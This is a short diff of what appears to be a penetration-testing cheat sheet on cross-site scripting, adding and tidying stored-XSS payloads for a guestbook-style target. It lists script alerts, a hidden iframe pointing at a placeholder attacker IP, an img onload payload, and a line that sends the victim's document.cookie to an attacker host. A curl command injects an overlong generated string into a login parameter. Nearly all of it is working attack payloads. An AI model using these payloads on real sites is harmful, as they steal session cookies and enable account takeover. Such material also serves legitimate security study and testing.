@@ -207,9 +207,10 @@ Injection into the html on the page in a blog:  <h1>test</h1>
 Try using an HTML entity:  &lt;script&gt:
 
 Stored - example: guestbook
-<script>alert("XSS");</script>
-<script>alert(document.cookie);</script>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
 <iframe SRC="http://attackerIP" height="0" width="0"></iframe>
+<img src="http://attackerIP/doom.png" onload="javascript:alert('red team')"/>
 <script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
